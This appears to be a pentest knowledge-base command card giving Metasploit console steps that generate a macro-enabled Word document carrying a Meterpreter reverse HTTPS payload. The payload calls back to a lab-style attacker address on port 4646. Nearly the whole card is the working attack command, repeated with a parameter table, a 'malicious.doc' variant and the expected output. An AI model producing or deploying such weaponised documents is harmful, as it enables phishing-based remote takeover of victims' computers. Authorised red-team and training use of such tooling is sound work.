---
id: 79c5e01c-7ca7-42aa-8fcc-dde64fdd92ab
name: generate-office-word-macro-with-meterpreter-payload
type: command
executor: msfconsole
data: |-
  use exploit/multi/fileformat/office_word_macro 
  set PAYLOAD windows/meterpreter/reverse_https
  set LHOST 10.10.14.22
  set LPORT 4646
  exploit
output: null
created_at: '2023-04-06T03:56:21.645318+00:00'
updated_at: '2023-04-10T20:25:01.012583+00:00'
platforms:
  - Windows
tags:
  - metasploit
  - payload
  - macro
verified: true
validated: true
---

# generate-office-word-macro-with-meterpreter-payload

## Command

```msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.10.14.22
set LPORT 4646
exploit
```

## Description

Configures and executes the Office Word macro exploit module in Metasploit to generate a malicious .doc file embedding a Meterpreter reverse HTTPS payload. The file triggers upon macro enablement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `LHOST` | Attacker's IP address for callback | Yes |
| `LPORT` | Port for the reverse connection (e.g., 4646) | Yes |
| `PAYLOAD` | Specifies the Meterpreter reverse HTTPS payload | Yes |

## Examples

### Basic Usage

```msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.10.14.22
set LPORT 4646
exploit
```

### Advanced Usage

```msfconsole
set FILENAME malicious.doc
exploit -e
```

## Expected Output

[*] Created document.doc - done
The file is generated in the current msfconsole directory.

## Related

- [[commands/start-meterpreter-reverse-https-handler]]
- [[procedures/Metasploit-Scripting-with-Meterpreter-Reverse-HTTPS-Payload]]
